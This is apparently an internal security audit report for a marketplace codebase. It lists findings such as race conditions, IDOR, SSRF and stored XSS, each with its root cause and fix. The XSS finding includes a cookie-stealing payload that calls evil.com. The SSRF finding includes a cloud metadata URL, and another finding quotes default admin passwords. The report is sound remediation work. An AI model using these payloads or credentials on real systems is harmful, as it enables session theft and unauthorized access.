# Twicely Security Audit Report

**Date:** 2026-04-05
**Commit:** a2bfd43
**Scope:** Full penetration-test-style security audit — 6 parallel agents covering all attack surfaces
**Agents:** Secrets & Backdoors, Auth & Brute Force, Injection Attacks, API & Access Control, Payment Security, Infrastructure

---

## Executive Summary

The codebase has strong baseline security: Drizzle ORM (parameterized queries), Zod validation with `.strict()`, CASL authorization on every route, DOMPurify on HTML rendering, AES-256-GCM encryption at rest, constant-time HMAC comparisons, and webhook signature verification on all external integrations.

However, **7 CRITICAL** and **14 HIGH** severity findings were identified that must be fixed before production launch.

| Severity | Count |
|----------|-------|
| CRITICAL | 7 |
| HIGH | 14 |
| MEDIUM | 16 |
| LOW | 10 |
| **Total** | **47** |

---

## CRITICAL FINDINGS (Fix Immediately)

### SEC-001: Stale Cart Price — TOCTOU in Checkout
**File:** `packages/commerce/src/create-order.ts:43-48, 154-165`
**Attack:** Buyer adds $500 item to cart. Seller raises price to $999. Buyer checks out at stale $500.
**Root cause:** `cartItem.priceCents` is snapshotted at add-to-cart time but never re-validated against the live `listing.priceCents` during checkout. The `FOR UPDATE` lock on listings checks status/quantity but NOT price.
**Fix:** Add `priceCents` to the locked listing select and use `lst.priceCents` instead of `cartItm.priceCents`.

### SEC-002: Coupon Race Condition — Unlimited Redemptions
**File:** `apps/web/src/lib/actions/checkout.ts:166-211`
**Attack:** 10 simultaneous checkout requests all read `usageCount = 0` before any increment. All 10 get the discount.
**Root cause:** Coupon validation is a non-atomic SELECT without `FOR UPDATE`. Usage is recorded AFTER payment succeeds.
**Fix:** Use `UPDATE ... WHERE usageCount < maxUsesTotal RETURNING id` pattern. Add `UNIQUE(promotionId, buyerId)` constraint.

### SEC-003: IDOR in Offer Mutations — Accept/Decline Any User's Offers
**File:** `apps/web/src/lib/actions/offers.ts:80-236`
**Attack:** User A calls `acceptOfferAction({ offerId: '<victim_offer_id>' })`. CASL check uses bare `'Offer'` without ownership conditions.
**Root cause:** Actions check `ability.can('update', 'Offer')` (unscoped) instead of `sub('Offer', { sellerId })`.
**Fix:** Fetch offer from DB first, verify `session.userId` is a party (seller or buyer), then proceed.

### SEC-004: No Rate Limiting on Staff Login — Brute Force Vector
**File:** `apps/web/src/lib/actions/staff-login.ts:22-51`
**Attack:** Unlimited password attempts on staff accounts (SUPER_ADMIN access).
**Root cause:** The marketplace `staff-login.ts` action has no Valkey-backed rate limiting (unlike `packages/auth/src/staff-auth.ts` which does).
**Fix:** Add Valkey-backed per-email counter (5 attempts, 15-min lockout) matching `staff-auth.ts` pattern.

### SEC-005: Stored XSS via Server Component DOMPurify
**File:** `apps/web/src/components/storefront/store-about.tsx:21`
**Attack:** Seller injects `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` in `aboutHtml`. DOMPurify is a browser-only library but `store-about.tsx` is a SERVER component (no `'use client'` directive) — DOMPurify is a no-op server-side.
**Root cause:** Missing `'use client'` directive on component that uses DOMPurify.
**Fix:** Add `'use client'` to `store-about.tsx` AND sanitize at write-time in `storefront.ts` action.

### SEC-006: SSRF in Perceptual Hash — Fetch Any URL
**File:** `apps/web/src/lib/authentication/phash.ts:43`
**Attack:** Submit `http://169.254.169.254/latest/meta-data/` as photo URL — server fetches AWS IMDS.
**Root cause:** `fetch(imageUrl)` with no hostname allowlist. Input only validates `z.string().url()`.
**Fix:** Add `ALLOWED_PHASH_HOSTNAMES` allowlist (same pattern as `ai-autofill-service.ts:84`).

### SEC-007: Payout TOCTOU Race + No Balance Check
**File:** `apps/web/src/lib/actions/payout-request.ts:94-128`
**Attack:** Two simultaneous requests both pass cooldown check (non-atomic DB + Valkey), creating double payouts.
**Root cause:** Cooldown check is two independent reads (Valkey + DB) without locking.
**Fix:** Use distributed lock (Valkey SETNX) before DB check. Validate available balance via `getSellerBalance` before payout.

---

## HIGH FINDINGS (Fix Before Launch)

### SEC-008: CSP Allows `unsafe-inline` + `unsafe-eval`
**File:** `apps/web/next.config.ts:24`
**Impact:** Negates all XSS protection from Content Security Policy.
**Fix:** Use nonce-based CSP with Next.js middleware.

### SEC-009: SUPPORT Role Can Impersonate Any User
**File:** `packages/casl/src/platform-abilities.ts:84`
**Impact:** First-line support agent compromise = all user data.
**Fix:** Restrict `impersonate` to `ADMIN`/`SUPER_ADMIN` only.

### SEC-010: OAuth Callback Doesn't Verify userId
**Files:** `apps/web/src/app/api/accounting/quickbooks/callback/route.ts:41-51`, `xero/callback`
**Impact:** OAuth session-swapping attack — link attacker's QB to victim's account.
**Fix:** Verify `stored.userId === session.userId` in callback.

### SEC-011: Upload Rate Limiter is In-Memory (Per-Process)
**File:** `apps/web/src/app/api/upload/route.ts:27-46`
**Impact:** N instances = N × 20 uploads/min. Resets on restart.
**Fix:** Replace with Valkey-backed counter.

### SEC-012: No `middleware.ts` — No Centralized Auth Guard
**Impact:** New routes added without `authorize()` call are silently public.
**Fix:** Add `middleware.ts` enforcing session on `/my/*` and hub routes.

### SEC-013: `X-Forwarded-For` Spoofable in Rate Limiting
**Files:** `newsletter/subscribe`, `search/suggestions`, `search/trending`, `affiliate/listing-click`
**Impact:** Attacker rotates IPs via header to bypass rate limits entirely.
**Fix:** Use rightmost IP or Railway-specific header. Require auth for sensitive endpoints.

### SEC-014: SSRF via Unvalidated Shopify `shopDomain`
**File:** `apps/web/src/lib/crosslister/connectors/shopify-auth.ts:79,134,218`
**Impact:** If HMAC secret compromised, server fetches arbitrary HTTPS URLs.
**Fix:** Validate domain matches `*.myshopify.com` pattern.

### SEC-015: Facebook Access Token in URL Query String
**File:** `apps/web/src/lib/crosslister/connectors/fb-marketplace-connector.ts:151,179,195`
**Impact:** Tokens appear in server logs, Referer headers, browser history.
**Fix:** Move to `Authorization: Bearer` header.

### SEC-016: `payout delayDays` — No Lower Bound
**File:** `packages/stripe/src/payouts.ts:200-202`
**Impact:** Could configure 0-day payout delay, increasing chargeback exposure.
**Fix:** Enforce `delayDays >= 2`.

### SEC-017: `finalizeOrder` Trusts PaymentIntent Metadata
**File:** `apps/web/src/lib/actions/checkout-finalize.ts:213-235`
**Impact:** Promotion usage tracking corruption via metadata manipulation.
**Fix:** Re-validate `promotionId` and `discountCents` against DB.

### SEC-018: Extension JWT Leaked in URL
**File:** `apps/web/src/app/api/extension/authorize/route.ts:33`
**Impact:** Token in URL appears in logs, Referer headers, browser history.
**Fix:** Use short-lived Valkey code exchanged server-side.

### SEC-019: `applyCoupon` Accepts Client-Supplied Prices
**File:** `apps/web/src/lib/actions/apply-coupon.ts:17-26`
**Impact:** Client can spoof `priceCents`/`categoryId`/`sellerId` to match promotions.
**Fix:** Load cart from DB server-side instead of accepting from client.

### SEC-020: Seed Files Have Default SUPER_ADMIN Passwords
**Files:** `packages/db/src/seed/seed-system.ts:29`, `seed-adrian-admin.ts:27`
**Impact:** `AdminPass123!` / `TwicelyAdmin123!` if `NODE_ENV` not set correctly.
**Fix:** Remove fallback defaults entirely. Make env var mandatory unconditionally.

### SEC-021: `Math.random()` for Certificate Numbers
**File:** `apps/web/src/lib/authentication/cert-number.ts:22-24`
**Impact:** Predictable cert numbers (36^5 = 60M space + weak PRNG).
**Fix:** Use `crypto.randomBytes()`.

---

## MEDIUM FINDINGS (Fix This Sprint)

| # | Finding | File | Fix |
|---|---------|------|-----|
| SEC-022 | Webhook idempotency fails open (dual outage = dupes) | `stripe/webhook-idempotency.ts:49-53` | Atomic check-and-insert in DB |
| SEC-023 | Checkout rate limit fails open (Valkey down = no limit) | `checkout.ts:80-93` | DB fallback or fail-closed |
| SEC-024 | `processReturnRefund` no internal auth guard | `stripe/refunds.ts:45-117` | Add `sellerIdGuard` param |
| SEC-025 | Stripe error messages leaked to client | `payout-request.ts:170-173` | Return generic error |
| SEC-026 | `ilike` with unescaped LIKE wildcards | Multiple admin queries | Add `escapeLike()` utility |
| SEC-027 | `sql.identifier` without table allowlist | `cleanup-data-purge.ts:39-40` | Add `ALLOWED_PURGE_TABLES` |
| SEC-028 | No rate limiting on auth request creation ($$$) | `authentication.ts`, `authentication-ai.ts` | Add Valkey rate limit |
| SEC-029 | No rate limiting on phone verification / OTP | `phone-verification.ts` | Add rate limit (SMS cost) |
| SEC-030 | Hand-rolled Centrifugo token format | `realtime/subscribe/route.ts:28-39` | Use `jose` standard JWT |
| SEC-031 | MFA optional for SUPER_ADMIN staff | `staff-mfa.ts:28-29` | Enforce MFA for ADMIN+ |
| SEC-032 | `aboutHtml` not sanitized at write time | `storefront.ts:128-132` | Add `sanitize-html` at write |
| SEC-033 | Video duration is client-controlled | `upload/video-handler.ts:85-97` | Server-side `ffprobe` |
| SEC-034 | `sellerStatus` always null in CASL | `authorize.ts:151` | Load from DB |
| SEC-035 | Shopify client secret in unencrypted platform_settings | `shopify/callback/route.ts:82` | Move to env var or encrypt |
| SEC-036 | 7-day sessions, no concurrent limit | `auth/server.ts:126-133` | Add session list + revocation |
| SEC-037 | Staff cookie `sameSite: 'lax'` | `staff-login.ts:45` | Change to `'strict'` |

---

## LOW FINDINGS

| # | Finding |
|---|---------|
| SEC-038 | bcrypt cost factor 10 (recommend 12+) |
| SEC-039 | `X-DNS-Prefetch-Control: on` leaks navigation |
| SEC-040 | Upload 500 responses include `error.message` |
| SEC-041 | Newsletter unsubscribe token never expires |
| SEC-042 | `verifyUrl` hardcoded to `twicely.co` |
| SEC-043 | Order numbers use `Math.random()` |
| SEC-044 | Shared OAuth state cookie name (QB + Xero) |
| SEC-045 | Impersonation token not invalidated on staff logout |
| SEC-046 | Staff lockout possible via email-targeted DoS |
| SEC-047 | Email enumeration via password reset response |

---

## Dependency Vulnerabilities

`pnpm audit` found **35 vulnerabilities**: 1 critical, 14 high, 18 moderate, 2 low.

| Severity | Package | Issue |
|----------|---------|-------|
| CRITICAL | swiper | Prototype pollution |
| HIGH | next@16.0.10 | HTTP request deserialization DoS |
| HIGH | node-forge | Multiple signature forgery + DoS |
| HIGH | picomatch | ReDoS via extglob |
| HIGH | path-to-regexp | ReDoS |
| HIGH | happy-dom | Credential leakage + code execution |
| HIGH | xmldom | XML injection via CDATA |
| HIGH | lodash | Code injection via `_.template` |
| HIGH | defu | Prototype pollution via `__proto__` |

**Action:** Update `next` (apps/admin) to 16.1.7+, update `swiper`, replace `node-forge` if possible.

---

## What's Secure (Confirmed Clean)

- **No hardcoded secrets in source** — all credentials from env vars
- **`.env.local` properly gitignored** — never committed
- **No `eval()`, `exec()`, `child_process`** with user input
- **All SQL via Drizzle ORM** — parameterized, no string concatenation
- **All webhook endpoints** verify HMAC signatures with `timingSafeEqual`
- **All cron routes** use `timingSafeEqual` for CRON_SECRET
- **155/155 server actions** have `authorize()` or `staffAuthorize()`
- **65/65 API routes** are protected
- **AES-256-GCM encryption** for OAuth tokens, tax IDs — correct IV/nonce handling
- **File uploads** use magic byte validation + CUID2 names (no path traversal)
- **Checkout re-validates coupons server-side** — overrides client values
- **`reverse_transfer: true` + `refund_application_fee: true`** on all refunds
- **Listings locked with `FOR UPDATE`** in checkout (prevents oversell)
- **Refund amount capped** at order total
- **IDOR guards** on payment methods (verify `pm.customer === customerId`)
- **Escrow hold** — seller cannot receive funds before delivery confirmation
- **Ed25519** for local transaction tokens
- **CASL `cannot` rules** prevent ledger entry modification

---

## Priority Remediation Plan

**Week 1 — Critical:**
1. SEC-001: Fix stale cart price (add `priceCents` to locked listing)
2. SEC-002: Fix coupon race condition (atomic check-and-increment)
3. SEC-003: Fix IDOR in offers (add ownership check)
4. SEC-004: Add staff login rate limiting
5. SEC-005: Fix XSS (`'use client'` + write-time sanitization)
6. SEC-006: Fix SSRF (URL allowlist)
7. SEC-007: Fix payout race (distributed lock)

**Week 2 — High:**
8. SEC-008: Fix CSP (nonce-based)
9. SEC-009: Restrict impersonation to ADMIN
10. SEC-010: Fix OAuth userId binding
11. SEC-011: Valkey-backed upload rate limiter
12. SEC-012: Add middleware.ts
13. SEC-013: Fix X-Forwarded-For spoofing
14. SEC-020: Remove seed default passwords
15. SEC-021: Crypto-safe cert numbers

**Week 3 — Medium + Dependencies:**
16. Remaining medium findings
17. Dependency updates (next, swiper, node-forge, lodash)
